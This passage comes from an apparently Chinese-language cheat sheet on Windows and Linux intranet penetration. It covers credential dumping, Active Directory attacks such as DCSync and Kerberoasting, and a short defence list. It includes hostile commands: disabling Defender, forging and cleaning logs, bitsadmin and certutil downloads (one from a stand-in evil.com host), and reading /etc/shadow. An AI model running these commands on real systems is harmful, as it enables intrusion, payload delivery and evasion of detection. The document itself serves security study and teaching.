<li><p>vssown.vbs + libesedb + NtdsXtract</p>
</li>
<li><p>ntdsdump</p>
</li>
<li><p>利用powershell(DSInternals)分析hash</p>
</li>
<li><p>使用 <code>net use \\%computername% /u:%username%</code> 重置密码尝试次数</p>
</li>
<li><p>限制读取时，可crash操作系统后，在蓝屏的dump文件中读取</p>
</li>
</ul>
<h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><ul>
<li>组策略首选项漏洞</li>
<li>DLL劫持</li>
<li>替换系统工具，实现后门</li>
<li>关闭defender<code>Set-MpPreference -disablerealtimeMonitoring $true</code></li>
</ul>
<h2 id="痕迹清理"><a href="#痕迹清理" class="headerlink" title="痕迹清理"></a>痕迹清理</h2><h3 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h3><p>查看日志：</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">eventvwr</span><br></code></pre></td></tr></table></figure>

<p>伪造日志：</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">eventcreate</span><br></code></pre></td></tr></table></figure>

<p>操作日志：</p>
<ul>
<li>3389登录列表</li>
<li>文件打开日志</li>
<li>文件修改日志</li>
<li>浏览器日志</li>
<li>系统事件</li>
<li>程序安装记录</li>
<li>程序删除记录</li>
<li>程序更新记录</li>
</ul>
<p>登录日志：</p>
<ul>
<li>系统安全日志</li>
</ul>
<p>日志路径：</p>
<ul>
<li>系统日志 <code>%SystemRoot%\System32\Winevt\Logs\System.evtx</code></li>
<li>安全日志 <code>%SystemRoot%\System32\Winevt\Logs\Security.evtx</code></li>
<li>应用程序日志 <code>%SystemRoot%\System32\Winevt\Logs\Application.evtx</code></li>
</ul>
<p>服务日志：</p>
<ul>
<li>IIS <code>%SystemDrive%\inetpub\logs\LogFiles\W3SVC1\</code></li>
</ul>
<h3 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h3><ul>
<li>AppCompatFlags</li>
<li>Background Activity Moderator (BAM)</li>
<li>MuiCache</li>
<li>RecentApps</li>
<li>RunMRU</li>
<li>ShimCache (AppCompatCache)</li>
</ul>
<h4 id="注册表键"><a href="#注册表键" class="headerlink" title="注册表键"></a>注册表键</h4><ul>
<li>HKEY_LOCAL_MACHINEsystemCurrentControlSetServicesEventlog</li>
</ul>
<h3 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h3><h4 id="Prefetch"><a href="#Prefetch" class="headerlink" title="Prefetch"></a>Prefetch</h4><p>预读取文件夹，用来存放系统已访问过的文件的预读信息，扩展名为PF。位置在 <code>C:\Windows\Prefetch</code></p>
<h4 id="JumpLists"><a href="#JumpLists" class="headerlink" title="JumpLists"></a>JumpLists</h4><p>记录用户最近使用的文档和应用程序，方便用户快速跳转到指定文件，位置在 <code>%APPDATA%\Microsoft\Windows\Recent</code></p>
<h4 id="Amcache-RecentFileCache-bcf"><a href="#Amcache-RecentFileCache-bcf" class="headerlink" title="Amcache &#x2F; RecentFileCache.bcf"></a>Amcache &#x2F; RecentFileCache.bcf</h4><p>Windows中的使用这两个文件来跟踪具有不同可执行文件的应用程序兼容性问题，它可用于确定可执行文件首次运行的时间和最后修改时间</p>
<p>在Windows 7、Windows Server 2008 R2等系统中，文件保存在 <code>C:\Windows\AppCompat\Programs\RecentFileCache.bcf</code> ，包含程序的创建时间、上次修改时间、上次访问时间和文件名</p>
<p>在Windows 8、Windows 10、Windows Server 2012等系统中，文件保存在 <code>C:\Windows\AppCompat\Programs\Amcache.hve</code> ，包含文件大小、版本、sha1、二进制文件类型等信息</p>
<h3 id="时间轴"><a href="#时间轴" class="headerlink" title="时间轴"></a>时间轴</h3><p>Windows时间轴是Windows 10在1803版中引入的一个新特性，会记录访问过的网站、编辑过的文档、运行的程序等</p>
<h3 id="彻底删除"><a href="#彻底删除" class="headerlink" title="彻底删除"></a>彻底删除</h3><ul>
<li>多次覆写文件 <code>cipher /w:&lt;path&gt;</code></li>
<li>格式化某磁盘count次 <code>format D: /P:&lt;count&gt;</code></li>
</ul>
<h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><h3 id="常见入口"><a href="#常见入口" class="headerlink" title="常见入口"></a>常见入口</h3><ul>
<li>SMB弱密码</li>
<li>SqlServer弱密码</li>
</ul>
<h3 id="LOLBAS"><a href="#LOLBAS" class="headerlink" title="LOLBAS"></a>LOLBAS</h3><h4 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h4><p>LOLBAS，全称Living Off The Land Binaries and Scripts (and also Libraries)，是一种白利用方式，是在2013年DerbyCon由Christopher Campbell和Matt Graeber发现，最终Philip Goh提出的概念</p>
<p>这些程序一般有有Microsoft或第三方认证机构的签名，但是除了可以完成正常的功能，也能够被用于内网渗透中。这些程序可能会被用于：下载安全恶意程序、执行恶意代码、绕过UAC、绕过程序控制等</p>
<h4 id="常见程序"><a href="#常见程序" class="headerlink" title="常见程序"></a>常见程序</h4><p><strong>appsyncvpublishing.exe</strong></p>
<ul>
<li>执行powershell</li>
</ul>
<p><strong>bitsadmin.exe</strong></p>
<ul>
<li>下载文件 <code>bitsadmin /create 1 bitsadmin /addfile 1 https://evil.com/autoruns.exe c:\data\playfolder\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1</code></li>
</ul>
<p><strong>cdb.exe</strong></p>
<p><strong>certutil.exe</strong></p>
<ul>
<li>可安装、备份、删除、管理和执行证书</li>
<li>证书存储相关功能</li>
<li>下载文件 <code>certutil -urlcache -split -f https://addr/example.exe</code></li>
<li>注意 certutil 是有cache的，需要显式删除</li>
<li>base64 编解码 <code>certutil -encode</code> &#x2F; <code>certutil -decode</code></li>
</ul>
<p><strong>cmd.exe</strong></p>
<p><strong>cmstp.exe</strong></p>
<p><strong>control.exe</strong></p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.dearbytes.com/blog/playing-around-with-nsa-hacking-tools/">加载dll</a></li>
</ul>
<p><strong>csc.exe</strong></p>
<ul>
<li>编译 C# 载荷</li>
</ul>
<p><strong>cscript.exe</strong></p>
<ul>
<li>执行脚本</li>
</ul>
<p><strong>extexport.exe</strong></p>
<p><strong>expand.exe</strong></p>
<ul>
<li>展开一个或多个压缩文件</li>
</ul>
<p><strong>forfiles.exe</strong></p>
<ul>
<li><code>forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe</code></li>
</ul>
<p><strong>mofcomp.exe</strong></p>
<p><strong>makecab.exe</strong></p>
<p><strong>msbuild.exe</strong></p>
<ul>
<li>构建应用程序</li>
</ul>
<p><strong>mshta.exe</strong></p>
<ul>
<li>HTML应用</li>
</ul>
<p><strong>msiexec.exe</strong></p>
<ul>
<li>安装msi</li>
<li>加载dll</li>
</ul>
<p><strong>msxsl.exe</strong></p>
<ul>
<li>处理XSL程序</li>
</ul>
<p><strong>netsh.exe</strong></p>
<p><strong>installutil.exe</strong></p>
<ul>
<li>安装&#x2F;卸载程序组件</li>
</ul>
<p><strong>IEExec.exe</strong></p>
<ul>
<li>.NET Framework附带程序</li>
</ul>
<p><strong>powershell.exe</strong></p>
<p><strong>psexec.exe</strong></p>
<ul>
<li><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec">https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec</a></li>
</ul>
<p><strong>reg.exe</strong></p>
<ul>
<li>注册表控制台</li>
</ul>
<p><strong>regedit.exe</strong></p>
<ul>
<li>注册表修改</li>
</ul>
<p><strong>regsvr32.exe</strong></p>
<ul>
<li>注册动态链接库&#x2F;ActiveX控件</li>
</ul>
<p><strong>rundll32.exe</strong></p>
<ul>
<li>执行DLL文件中的内部函数</li>
</ul>
<p><strong>sc.exe</strong></p>
<ul>
<li>查看服务状态管理</li>
</ul>
<p><strong>schtasks.exe</strong></p>
<ul>
<li>定时计划任务</li>
</ul>
<p><strong>shred</strong></p>
<ul>
<li>重复写入文件，防止文件恢复</li>
</ul>
<p><strong>type.exe</strong></p>
<ul>
<li>利用ads隐藏文件 <code>type &lt;filepath&gt; &lt;target_file:ads&gt;</code></li>
</ul>
<p><strong>wmic.exe</strong></p>
<ul>
<li>Windows管理工具</li>
</ul>
<p><strong>windbg.exe</strong></p>
<p><strong>winrm.exe</strong></p>
<p><strong>wscript.exe</strong></p>
<ul>
<li>脚本引擎</li>
</ul>
<p><strong>waitfor.exe</strong></p>
<ul>
<li>用于同步网络中计算机，可以发送或等待系统上的信号</li>
</ul>
<h2 id="MSPRC"><a href="#MSPRC" class="headerlink" title="MSPRC"></a>MSPRC</h2><p>MSRPC (Microsoft Remote Procedure Call) 是微软对 DCE&#x2F;RPC 协议的修改实现，用于支持Windows系统中应用程序的远程网络调用。</p>
<p>MSRPC所使用的端口有 UDP 135 和 TCP 139 &#x2F; 445 。</p>
<p>MSRPC 可以用于</p>
<ul>
<li>用户遍历</li>
<li>服务遍历</li>
<li>凭证导出</li>
<li>横向移动</li>
<li>权限提升</li>
</ul>
<h2 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h2><h3 id="用户组与工作组"><a href="#用户组与工作组" class="headerlink" title="用户组与工作组"></a>用户组与工作组</h3><h4 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h4><p>Windows系统存在一些为了特定用途而设置的用户，分别是：SYSTEM(系统)、Trustedinstaller(信任程序模块)、Everyone(所有人)、Creator Owner(创建者)等，这些特殊用户不属于任何用户组，是完全独立的账户。其中SYSTEM拥有整台计算机管理权限的账户，一般操作无法获取与它等价的权限</p>
<h4 id="用户组"><a href="#用户组" class="headerlink" title="用户组"></a>用户组</h4><p>Windows系统内置了许多本地用户组，用于管理用户权限。只要用户账户加入到对应的用户组内，则用户账户也将具备对应用户组所拥有的权限</p>
<p>默认情况下，系统为用户分了7个组，并给每个组赋予不同的操作权限。这些组为：管理员组(Administrators)、高权限用户组(Power Users)、普通用户组(Users)、备份操作组(Backup Operators)、文件复制组(Replicator)、来宾用户组(Guests)、身份验证用户组(Authenticated Users)</p>
<h4 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h4><p>工作组（Workgroup）是最常用最简单最普遍的资源管理模式，默认情况下计算机都在名为workgroup的工作组中。工作组模式比较松散，适合网络中计算机数量较少，不需要严格管理的情况</p>
<h3 id="域中用户"><a href="#域中用户" class="headerlink" title="域中用户"></a>域中用户</h3><h4 id="域用户"><a href="#域用户" class="headerlink" title="域用户"></a>域用户</h4><p>域环境中的用户和本地用户的帐户不同，域用户帐户保存在活动目录中。在域环境中，一个域用户可以在域中的任何一台计算机上登录。在域中用户可以使用SID (Security Identifier) 来表明身份，用NTLM哈希或者Kerberos来验证身份</p>
<h4 id="机器用户"><a href="#机器用户" class="headerlink" title="机器用户"></a>机器用户</h4><p>机器用户也被称作机器账号或计算机账号，所有加入域的主机都会有一个机器用户，机器用户的用户名以 <code>$</code> 结尾</p>
<h3 id="组策略"><a href="#组策略" class="headerlink" title="组策略"></a>组策略</h3><p>组策略(Group Policy)用于控制用户帐户和计算机帐户的工作环境。组策略提供了操作系统、应用程序和活动目录中用户设置的集中化管理和配置。其中本地的组策略(LGPO或LocalGPO)，可以在独立且非域的计算机上管理组策略对象。在域环境中的组策略通常被称作GPO(Group Policy Object)</p>
<h3 id="内网常用协议"><a href="#内网常用协议" class="headerlink" title="内网常用协议"></a>内网常用协议</h3><p>Windows查询名称解析的顺序为DNS、mDNS、LLMNR、NBNS</p>
<h4 id="NetBIOS"><a href="#NetBIOS" class="headerlink" title="NetBIOS"></a>NetBIOS</h4><p>NetBIOS（Network Basic Input&#x2F;Output System）是基于网络的交互协议，通常使用UDP 137、UDP 138、TCP 139等端口。Windows在安装TCP&#x2F;IP协议时会默认启用该协议，可能导致未设置权限校验的网络资源被访问</p>
<p>基于NetBIOS有NBNS (NetBIOS Name Service)服务，通常监听在UDP 137端口，该服务提供三种功能：将NetBIOS名称解析到IP、查询某一个NetBIOS节点的状态，注册&#x2F;释放一个NetBIOS名</p>
<p>可以使用 <code>nbtstat</code> 工具利用NetBIOS协议管理网络</p>
<h4 id="LLMNR"><a href="#LLMNR" class="headerlink" title="LLMNR"></a>LLMNR</h4><p>链路本地多播名称解析 (Link-Local Multicast Name Resolution, LLMNR)是一个基于DNS数据包格式的协议，IPv4和IPv6的主机可以通过此协议对同一本地链路上的主机执行名称解析。该协议在Windows Vista后被引入。 LLMNR监听UDP 5355端口，可以通过多播地址 224.0.0.252 (或 <code>FF02:0:0:0:0:0:1:3</code>) 访问</p>
<h4 id="mDNS"><a href="#mDNS" class="headerlink" title="mDNS"></a>mDNS</h4><p>mDNS (multicast DNS) 在Windows 10中被引入，监听UDP 5353端口，对应的多播地址为 224.0.0.251 ( <code>FF02::FB</code> ) 。mDNS主要实现了在没有传统DNS服务器的情况下使局域网内的主机实现相互发现和通信</p>
<h4 id="WPAD"><a href="#WPAD" class="headerlink" title="WPAD"></a>WPAD</h4><p>网络代理自动发现协议 (Web Proxy Auto-Discovery, WPAD) 是一种客户端使用DHCP和&#x2F;或DNS发现方法来定位一个配置文件URL的方法。在检测和下载配置文件后，它可以执行配置文件以测定特定URL应使用的代理</p>
<h3 id="域"><a href="#域" class="headerlink" title="域"></a>域</h3><p>域指将网络中多台计算机逻辑上组织到一起，进行集中管理的逻辑环境。域是组织与存储资源的核心管理单元，在域中，至少有一台域控制器，域控制器中保存着整个域的用户帐号和安全数据库</p>
<h4 id="域结构"><a href="#域结构" class="headerlink" title="域结构"></a>域结构</h4><h5 id="域树"><a href="#域树" class="headerlink" title="域树"></a>域树</h5><p>域树（Trees）由多个域组成，这些域共享同一表结构和配置，形成一个连续的命名空间（namespace）</p>
<h5 id="林"><a href="#林" class="headerlink" title="林"></a>林</h5><p>林（Forests）是一个复杂的AD实例，由一个或数个域组成，每个域树都有自己唯一的名称空间</p>
<h4 id="域控制器"><a href="#域控制器" class="headerlink" title="域控制器"></a>域控制器</h4><p>ADDS的目录存储在域控制器(Domain Controller)内，一个域内可以有多台域控制器，每一个域控制器的地位几乎是平等的，有几乎相同的数据库</p>
<p>在一台域控制器添加一个用户账户后，这个账户会被自动复制到其他域控制器的数据库中</p>
<p>AD数据库有多主机复制模式（Multi-master Replication Model）和单主机复制模式（Sing-master Replication Model）</p>
<p>多主机模式可以直接更新任何一台域控制器内的AD对象，并将更新之后的对象复制到其他域控制器，大部分数据都是用多主机模式进行复制</p>
<p>单主机复制模式是指由一台被称作操作主机（Operations Master）的域控制器负责接收更改数据的请求，并将数据复制到其他的域控制器</p>
<h4 id="信任"><a href="#信任" class="headerlink" title="信任"></a>信任</h4><p>两个域之间需要创建信任关系，才可以访问对应域内的资源</p>
<h5 id="域信任类型"><a href="#域信任类型" class="headerlink" title="域信任类型"></a>域信任类型</h5><p>Active Directory的信任方式可以分为以下几种：</p>
<p><strong>Tree-Root Trust</strong></p>
<ul>
<li>双向具有转移性</li>
</ul>
<p><strong>Parent-Child Trust</strong></p>
<ul>
<li>具有转移性，双向行人</li>
</ul>
<p><strong>Forest Trust</strong></p>
<ul>
<li>如果两个林创建了信任关系，则林中所有的域都相互信任</li>
<li>两个林之间的信任关系无法自动扩展到其他林上</li>
</ul>
<p><strong>Realm Trust</strong></p>
<ul>
<li>ADDS域可以和非Windows系统的Kerberos域之间创建信任</li>
</ul>
<p><strong>External Trust</strong></p>
<ul>
<li>位于两个林内的域之间可以通过外部信任来创建信任关系</li>
</ul>
<p><strong>Shortcut Trust</strong></p>
<ul>
<li>可以缩短验证用户身份的时间</li>
</ul>
<h4 id="OU"><a href="#OU" class="headerlink" title="OU"></a>OU</h4><p>组织单位（Organization Unit，OU）是一个容器对象，将域中的对象组织成逻辑组，帮助管理员管理。OU包含用户、计算机、工作组、打印机、安全策略以及其他组织单位等</p>
<h3 id="Active-Directory"><a href="#Active-Directory" class="headerlink" title="Active Directory"></a>Active Directory</h3><p>活动目录 (Active Directory，AD) 是面向Windows Server的目录服务。Active Directory存储了有关网络对象的信息，并且让管理员和用户能够查找和使用这些信息</p>
<h4 id="ADDS"><a href="#ADDS" class="headerlink" title="ADDS"></a>ADDS</h4><p>Active Directory提供目录服务的组件被称作Active Directory域服务 (Active Directory Domain Services, ADDS) ，负责目录数据库的存储、增删改查等工作，可以用在多种局域网、广域网的场景中</p>
<p>从逻辑上看，ADDS的组件可以分为Partition、Schema、Domain、Domain tree、Forest、OU、Container</p>
<p>Partition也被称为naming context，是AD DS数据库的一部分。Schema是存储在 ADDS 中数据的定义。Container是为ADDS提供组织框架的对象</p>
<p>从实现上区分，ADDS可以分为Domain controller、Data store、Global catalog server、RODC (Read-only domain controller) 、Site、Subnet</p>
<p>每个域控制器都有完整的ADDS数据，每个域控都可以处理数据的修改并同步至其他的域控</p>
<p>域控会有一份数据拷贝 (Data store) ，默认存储在 <code>C:\Windows\NTDS</code> 目录下</p>
<p>Global catalog server是存储全局catalog的域控，catlog以只读的方式存储了一个multiple-domain forest的所有对象，用于加速搜索</p>
<h4 id="名称空间"><a href="#名称空间" class="headerlink" title="名称空间"></a>名称空间</h4><p>名称空间 (namespace) 是一块界定好的区域，在区域内可以用名称找到与之相关的信息</p>
<h4 id="对象与属性"><a href="#对象与属性" class="headerlink" title="对象与属性"></a>对象与属性</h4><p>ADDS内的资源都是以对象 (Object) 的形式存在的，对象通过属性 (Attrbute) 来描述其特征</p>
<h3 id="ADCS"><a href="#ADCS" class="headerlink" title="ADCS"></a>ADCS</h3><h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>Active Directory 证书服务 (Active Directory Certificate Services，AD CS) 是微软用于实现 PKI 的服务</p>
<h4 id="证书"><a href="#证书" class="headerlink" title="证书"></a>证书</h4><p>ADCS 中的证书是 X.509 格式的数字签名文档，用于加密、签名或身份验证等</p>
<p>证书常用的属性由下述字段组成</p>
<ul>
<li>Subject：主题</li>
<li>Public Key：公钥</li>
<li>Extended Key Usages (EKUs)：扩展密钥，描述证书的对象标识符 (Object identifier, OID)</li>
</ul>
<p>常用的 EKU OID 包括：</p>
<p><strong>代码签名</strong></p>
<ul>
<li>OID 1.3.6.1.5.5.7.3.3</li>
<li>证书用于签署可执行代码</li>
</ul>
<p><strong>加密文件系统</strong></p>
<ul>
<li>OID 1.3.6.1.4.1.311.10.3.4</li>
<li>证书用于加密文件系统</li>
</ul>
<p><strong>安全电子邮件</strong></p>
<ul>
<li>OID 1.3.6.1.5.5.7.3.4</li>
<li>证书用于加密电子邮件</li>
</ul>
<p><strong>客户端身份验证</strong></p>
<ul>
<li>OID 1.3.6.1.5.5.7.3.2</li>
</ul>
<p><strong>智能卡登录</strong></p>
<ul>
<li>OID 1.3.6.1.4.1.311.20.2.2</li>
</ul>
<p><strong>服务器认证</strong></p>
<ul>
<li>OID 1.3.6.1.5.5.7.3.1</li>
<li>证书用于识别服务器 (例如HTTPS 证书)</li>
</ul>
<h5 id="证书模板"><a href="#证书模板" class="headerlink" title="证书模板"></a>证书模板</h5><p>微软提供了证书模板的功能，方便在域内签发证书。证书模板是注册策略和预定义证书设置的集合，包含证书有效期、用途、申请者等信息</p>
<h5 id="证书注册"><a href="#证书注册" class="headerlink" title="证书注册"></a>证书注册</h5><p>证书可以通过以下几种方式注册：</p>
<ul>
<li>通过 Windows 客户端证书注册协议 (MS-WCCE)</li>
<li>通过 ICertPassage 远程协议 (MS-ICPR)</li>
<li>在 ADCS 开启了对应 Web 服务的情况下，使用 Web 服务注册</li>
<li>在服务器安装了对应服务时，通过证书注册服务 (CES) 注册</li>
<li>在服务器安装了对应服务时，使用网络设备注册服务</li>
</ul>
<h3 id="组策略-1"><a href="#组策略-1" class="headerlink" title="组策略"></a>组策略</h3><h4 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h4><p>组策略 (Group Policy, GP) 用于管理网络环境中的用户和设备，定义了系统管理员管理工作所要的各种模板组件</p>
<p>组策略有以下功能：</p>
<ul>
<li>管理注册表</li>
<li>设置脚本</li>
<li>重定向文件夹</li>
<li>管理应用程序</li>
<li>指定安全选项</li>
</ul>
<h4 id="常用概念"><a href="#常用概念" class="headerlink" title="常用概念"></a>常用概念</h4><p>组策略容器 (Group Policy Container，GPC)存储在活动目录中，包含GPO属性、配置信息和版本等。可以通过GPC来查找GPT</p>
<p>组策略模板 (Group Policy Template, GPT) 存储在域控中，包含所有的组策略信息。包括管理模板，安全，脚本，软件安装等</p>
<p>其中GPC中的信息量少、容量小，GPT中消息量较大、容量大，因此两个部分分开存放。防止活动目录中因存储了过多的数据而被影响性能</p>
<p>组策略对象 (Group Policy Object, GPO) 是包含多种Windows组策略设置的集合，存储在GPC和GPT中</p>
<h3 id="Kerberos的Windows实现"><a href="#Kerberos的Windows实现" class="headerlink" title="Kerberos的Windows实现"></a>Kerberos的Windows实现</h3><h4 id="相关定义"><a href="#相关定义" class="headerlink" title="相关定义"></a>相关定义</h4><h5 id="SPN"><a href="#SPN" class="headerlink" title="SPN"></a>SPN</h5><p>服务主体名称 (ServicePrincipal Names, SPN) ，是服务实例(如HTTP、SMB等)的唯一标识符</p>
<p>SPN分为两种类型：一种是注册在活动目录的机器帐户下，当一个服务的权限为 Local System 或 Network Service，则SPN注册在机器帐户下。一种是注册在活动目录的域用户帐户下，当一个服务的权限为一个域用户，则SPN注册在域用户帐户下</p>
<h3 id="域内攻击思路"><a href="#域内攻击思路" class="headerlink" title="域内攻击思路"></a>域内攻击思路</h3><p><strong>获取域控权限</strong></p>
<ul>
<li>通过域控相关漏洞</li>
<li>抓hash，尤其是域管理员、运维等高权限账号的哈希</li>
</ul>
<p><strong>控制入域机器</strong></p>
<ul>
<li>下发恶意策略控制</li>
<li>获取域内用户凭证</li>
<li>利用错误的域管理配置</li>
<li>域内relay</li>
</ul>
<p><strong>获取服务票据</strong></p>
<ul>
<li>攻击Exchange等服务器</li>
</ul>
<h3 id="攻击类型"><a href="#攻击类型" class="headerlink" title="攻击类型"></a>攻击类型</h3><h4 id="黄金票据利用"><a href="#黄金票据利用" class="headerlink" title="黄金票据利用"></a>黄金票据利用</h4><p>在认证过程中，经过client与AS的通信会得到TGT，黄金票据（Golden Ticket）就是伪造票据授予票据（TGT），也被称为认证票据</p>
<p>黄金票据利用需要与DC通信，且需要获取krbtgt的hash，但是可以获取任何Kerbose服务权限</p>
<h4 id="白银票据利用"><a href="#白银票据利用" class="headerlink" title="白银票据利用"></a>白银票据利用</h4><p>白银票据（Silver Tickets）伪造利用的是Kerberos认证中的第三个步骤，在第三步的时候，client会带着ticket向server的某个服务进行请求，如果验证通过就可以访问server上的指定服务了，这里的ticket是基于client info、server session key、end time、server hash。这里client info已知，end time可以构造，server session key是TGS生成的，所以只要server的NTLM hash即可。银票伪造的是TGS，只能访问指定的服务</p>
<h4 id="DCSync-攻击"><a href="#DCSync-攻击" class="headerlink" title="DCSync 攻击"></a>DCSync 攻击</h4><p>域内有多台域控服务器时，为了同步域控服务器的修改，微软提供了基于远程目录协议 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/f977faaa-673e-4f66-b9bf-48c640241d47">DRSR</a> 的同步机制</p>
<p>在多个域控服务器之间，每隔一段时间会有一次域数据的同步。由需要同步的域控服务器向其它服务器发送 GetNCChanges 请求，请求中包含需要同步的数据。数据量较多时，则重复这个过程</p>
<p>DCSync 就是使用这种机制进行域渗透的技术，由Benjamin DELPY gentilkiwi和Vincent LE TOUX共同编写，在2015年添加到 mimikatz 的一个功能，可以导出域内所有用户的hash</p>
<p>这种方式需要满足以下任一一种权限：</p>
<ul>
<li>Administrators 组内的用户</li>
<li>Domain Admins 组内的用户</li>
<li>Enterprise Admins 组内的用户</li>
<li>域控制器的计算机帐户</li>
</ul>
<p>或者拥有特定的几条 DACL:</p>
<ul>
<li>DS-Replication-Get-Changes</li>
<li>DS-Replication-Get-Changes-All</li>
<li>DS-Replication-Get-Changes-In-Filtered-Set</li>
</ul>
<p>当没有管理员用户，但是拥有 WriteDACL 权限时，可以写入上述 DACL 来完成 DCSync</p>
<p>对于这种攻击，可以通过检测 GetNCChanges 发起者的方式，如果由非域控机器发起对应请求，则可以认为是 DCSync 攻击</p>
<h4 id="DCShadow-攻击"><a href="#DCShadow-攻击" class="headerlink" title="DCShadow 攻击"></a>DCShadow 攻击</h4><p>DCShadow是由来自法国的安全研究人员Benjamin Delpy和Vincent Le Toux在2018年的微软蓝帽（Blue Hat）大会上提出</p>
<p>DCShadow攻击指在Active Directory环境下创建一个恶意的域控制器，并用它来推送恶意对象</p>
<h4 id="哈希传递攻击"><a href="#哈希传递攻击" class="headerlink" title="哈希传递攻击"></a>哈希传递攻击</h4><p>哈希传递攻击（Pass-the-Hash，PTH）是通过传递NTLM哈希来认证的攻击方法，常用的工具有mimikatz等</p>
<h4 id="票据传递攻击"><a href="#票据传递攻击" class="headerlink" title="票据传递攻击"></a>票据传递攻击</h4><p>票据传递攻击（Pass-the-Ticket Attacks，PtT）是一种使用Kerberos票据代替明文密码或NTLM哈希的方法。PtT最常见的用途可能是使用黄金票据和白银票据，通过PtT访问主机相当简单</p>
<h4 id="Kerberoasting-Attacks"><a href="#Kerberoasting-Attacks" class="headerlink" title="Kerberoasting Attacks"></a>Kerberoasting Attacks</h4><p>Kerberoasting攻击由Tim Medin在2014 DerbyCon conference上 <a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=PUyhlN-E5MU">公开</a> 。指域内的任何一台主机，都可以通过查询SPN，Kerberoasting即是向域内的所有服务请求TGS，然后进行暴力破解</p>
<h4 id="Roasting-AS-REP"><a href="#Roasting-AS-REP" class="headerlink" title="Roasting AS-REP"></a>Roasting AS-REP</h4><p>该攻击枚举域中不需要Kerberos预身份认证的帐户，向这些账户请求一条加密信息，并离线尝试获取到的账户哈希。该方式需要账户明确设置了 <code>DONT_REQ_PREAUTH</code></p>
<h4 id="Kerberos-Delegation-Attacks"><a href="#Kerberos-Delegation-Attacks" class="headerlink" title="Kerberos Delegation Attacks"></a>Kerberos Delegation Attacks</h4><p>在一个域中，A使用Kerberos身份验证访问服务B，B再使用A的身份去访问C，这个过程就可以理解为委派。委派主要分为非约束委派（Unconstrained delegation）和约束委派（Constrained delegation）两种，非约束委派可以访问域内任意其它服务，约束委派对认证做了限制不可以访问其他的服务</p>
<p>Kerberos Delegation（Kerberos委派）攻击分为非约束委派攻击和约束委派攻击。原理都是基于域内已经配置了委派的账户来获取其它账户的权限</p>
<h4 id="其他漏洞利用"><a href="#其他漏洞利用" class="headerlink" title="其他漏洞利用"></a>其他漏洞利用</h4><ul>
<li>域用户提权 (CVE-2022-26923)</li>
<li>KDC bamboozling (CVE-2021-42287)</li>
<li>Name impersonation (CVE-2021-42278)</li>
<li>ProxyShell (CVE-2021-34473)</li>
<li>ProxyLogon (CVE-2021-26855)</li>
<li>PrintNightmare (CVE-2021-1675 &#x2F; CVE-2021-34527)</li>
<li>SMBGhost (CVE-2020-0796)</li>
<li>Zerologon (CVE-2020-1472)</li>
<li>NTLM Relay (CVE-2019-1040)</li>
<li>永恒之蓝 (MS17-010)</li>
<li>域用户提权 (MS14-068)</li>
<li>Gpp漏洞 (MS14-025)</li>
<li>SAMR协议漏洞 (MS14-016)</li>
</ul>
<h3 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h3><ul>
<li>使用ATA等商业化防护工具</li>
<li>安装杀毒软件、EDR等工具</li>
<li>关闭高危服务</li>
<li>统一配置防火墙策略</li>
<li>对域控等高危账号使用白名单进行行为管理</li>
</ul>
<p><strong>检测高危操作</strong></p>
<ul>
<li>权限提升</li>
<li>高危账号密码修改、重置</li>
</ul>
<p><strong>行为频率建模</strong></p>
<ul>
<li>对大量尝试登录&#x2F;信息查询进行报警</li>
</ul>
<p><strong>对特定攻击行为进行监控</strong></p>
<ul>
<li>通过GPO下发自启动、计划任务</li>
</ul>
<h1 id="Linux内网渗透"><a href="#Linux内网渗透" class="headerlink" title="Linux内网渗透"></a>Linux内网渗透</h1><h2 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="获取内核、操作系统和设备信息"><a href="#获取内核、操作系统和设备信息" class="headerlink" title="获取内核、操作系统和设备信息"></a>获取内核、操作系统和设备信息</h3><p><strong>版本信息</strong></p>
<ul>
<li><code>uname -a</code> 所有版本</li>
<li><code>uname -r</code> 内核版本信息</li>
<li><code>uname -n</code> 系统主机名字</li>
<li><code>uname -m</code> Linux内核架构</li>
</ul>
<p><strong>内核信息</strong></p>
<ul>
<li><code>cat /proc/version</code></li>
</ul>
<p><strong>CPU信息</strong></p>
<ul>
<li><code>cat /proc/cpuinfo</code></li>
</ul>
<p><strong>发布信息</strong></p>
<ul>
<li><code>cat /etc/*-release</code></li>
<li><code>cat /etc/issue</code></li>
</ul>
<p><strong>主机名</strong></p>
<ul>
<li><code>hostname</code></li>
</ul>
<p><strong>文件系统</strong> </p>
<ul>
<li><code>df -a</code></li>
</ul>
<p><strong>内核日志</strong> </p>
<ul>
<li><code>dmesg</code> &#x2F; <code>/var/log/dmesg</code></li>
</ul>
<h3 id="用户和组"><a href="#用户和组" class="headerlink" title="用户和组"></a>用户和组</h3><ul>
<li><p>列出系统所有用户 <code>cat /etc/passwd</code></p>
</li>
<li><p>列出系统所有组 <code>cat /etc/group</code></p>
</li>
<li><p>列出所有用户hash（root）<code>cat /etc/shadow</code></p>
</li>
<li><p>查询用户的基本信息 <code>finger</code></p>
</li>
